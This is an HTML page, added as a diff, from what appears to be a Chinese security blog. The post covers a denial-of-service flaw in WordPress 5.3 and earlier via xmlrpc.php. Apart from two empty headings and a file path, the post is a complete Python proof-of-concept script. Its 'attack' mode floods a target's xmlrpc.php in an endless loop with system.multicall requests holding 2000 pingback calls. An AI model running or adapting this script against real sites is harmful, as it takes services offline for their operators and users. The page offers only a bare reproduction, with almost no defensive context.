@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WordPress &lt;&#x3D;5.3.x xmlrpc.php拒绝服务漏洞一、漏洞简介二、漏洞影响WordPress &lt;&#x3D; 5.3 三、复现过程漏洞文件 &#x2F;wordpress&#x2F;xmlrpc.php &#x2F;wp&#x2F;xmlrpc.php from urllib.parse import urlparse import sys, uuid, urllib3, requests urllib3.disab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_=5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="WordPress &lt;&#x3D;5.3.x xmlrpc.php拒绝服务漏洞一、漏洞简介二、漏洞影响WordPress &lt;&#x3D; 5.3 三、复现过程漏洞文件 &#x2F;wordpress&#x2F;xmlrpc.php &#x2F;wp&#x2F;xmlrpc.php from urllib.parse import urlparse import sys, uuid, urllib3, requests urllib3.disab">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:07.687Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Wordpress/Wordpress 系统漏洞/WordPress _=5.3.0 xmlrpc.php 拒绝服务漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_=5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.687Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WordPress-lt-5-3-x-xmlrpc-php拒绝服务漏洞"><a href="#WordPress-lt-5-3-x-xmlrpc-php拒绝服务漏洞" class="headerlink" title="WordPress &lt;=5.3.x xmlrpc.php拒绝服务漏洞"></a>WordPress &lt;=5.3.x xmlrpc.php拒绝服务漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WordPress &lt;= 5.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞文件</p>
+<pre><code>/wordpress/xmlrpc.php
+/wp/xmlrpc.php
+from urllib.parse import urlparse
+import sys, uuid, urllib3, requests
+urllib3.disable_warnings()
+
+DEBUG = True 
+def dprint(X):
+    if DEBUG: print(X)
+
+COUNT=0
+def build_entry(pingback,target):
+    global COUNT
+    COUNT +=1
+    entry  = &quot;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;pingback.ping&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&quot;
+    entry += f&quot;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&#123;pingback&#125;/&#123;COUNT&#125;&lt;/value&gt;&quot;
+    #entry += f&quot;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&#123;pingback&#125;/&#123;uuid.uuid4()&#125;&lt;/value&gt;&quot;
+    entry += f&quot;&lt;value&gt;&#123;target&#125;/?p=1&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&quot;
+    #entry += f&quot;&lt;value&gt;&#123;target&#125;/#e&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&quot; # taxes DB more
+    return entry
+
+def build_request(pingback,target,entries):
+    prefix   = &quot;&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;array&gt;&quot;
+    suffix   = &quot;&lt;/array&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;
+    request  = prefix
+    for _ in range(0,entries): request += build_entry(pingback,target)
+    request += suffix
+    return request
+
+def usage_die():
+    print(f&quot;[!] Usage: &#123;sys.argv[0]&#125; &lt;check/attack&gt; &lt;pingback url&gt; &lt;target url&gt;&quot;)
+    exit(1)
+
+def get_args():
+    if len(sys.argv) != 4: usage_die()
+    action   = sys.argv[1]
+    pingback = sys.argv[2]
+    target   = sys.argv[3]
+    if action not in (&quot;check&quot;,&quot;attack&quot;): usage_die()
+    for URL in (pingback,target):
+        res = urlparse(URL)
+        if not all((res.scheme,res.netloc)): usage_die()
+    return (action,pingback,target)
+
+def main(action,pingback,target):
+    print(&quot;[&gt;] WordPress &lt;= 5.3.? Denial-of-Service PoC&quot;)
+    print(&quot;[&gt;] @roddux 2019 | Arcturus Security | labs.arcturus.net&quot;)
+    # he checc
+    if action == &quot;check&quot;:    entries = 2
+    # he attacc
+    elif action == &quot;attack&quot;: entries = 2000
+    # but most importantly
+    print(f&quot;[+] Running in &#123;action&#125; mode&quot;)
+    # he pingbacc
+    print(f&quot;[+] Got pingback URL \&quot;&#123;pingback&#125;\&quot;&quot;)
+    print(f&quot;[+] Got target URL \&quot;&#123;target&#125;\&quot;&quot;)
+    print(f&quot;[+] Building &#123;entries&#125; pingback calls&quot;)
+    # entries = 1000 # TESTING
+    xmldata = build_request(pingback,target,entries)
+    dprint(&quot;[+] Request:\n&quot;)
+    dprint(xmldata+&quot;\n&quot;)
+    print(f&quot;[+] Request size: &#123;len(xmldata)&#125; bytes&quot;)
+    if action == &quot;attack&quot;:
+        print(&quot;[+] Starting attack loop, CTRL+C to stop...&quot;)
+        rcount = 0
+        try:
+            while True:
+                    try:
+                        resp  = requests.post(f&quot;&#123;target&#125;/xmlrpc.php&quot;, xmldata, verify=False, allow_redirects=False, timeout=.2)
+                        #dprint(resp.content.decode(&quot;UTF-8&quot;)[0:500]+&quot;\n&quot;)
+                        if resp.status_code != 200:
+                            print(f&quot;[!] Received odd status (&#123;resp.status_code&#125;) -- DoS successful?&quot;)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+                        pass
+                    rcount += 1
+                    print(f&quot;\r[+] Requests sent: &#123;rcount&#125;&quot;,end=&quot;&quot;)
+        except KeyboardInterrupt:
+            print(&quot;\n[&gt;] Attack finished&quot;,end=&quot;\n\n&quot;)
+            exit(0)
+    elif action == &quot;check&quot;:
+        print(&quot;[+] Sending check request&quot;)
+        try:
+            resp = requests.post(f&quot;&#123;target&#125;/xmlrpc.php&quot;, xmldata, verify=False, allow_redirects=False, timeout=10)
+            if resp.status_code != 200:
+                print(f&quot;[!] Received odd status (&#123;resp.status_code&#125;) -- check target url&quot;)
+            print(&quot;[+] Request sent&quot;)
+            print(&quot;[+] Response headers:\n&quot;)
+            print(resp.headers)
+            print(&quot;[+] Response dump:&quot;)
+            print(resp.content.decode(&quot;UTF-8&quot;))
+            print(&quot;[+] Here&#39;s the part where you figure out if it&#39;s vulnerable, because I CBA to code it&quot;)
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+            print(&quot;[!] Connection error&quot;)
+            exit(1)
+        print(&quot;[&gt;] Check finished&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main(*get_args()
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/WordPress%20_=5.3.0%20xmlrpc.php%20%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygo00m4y8v1fughhrts" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-6514%EF%BC%89WordPress%204.7.2%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
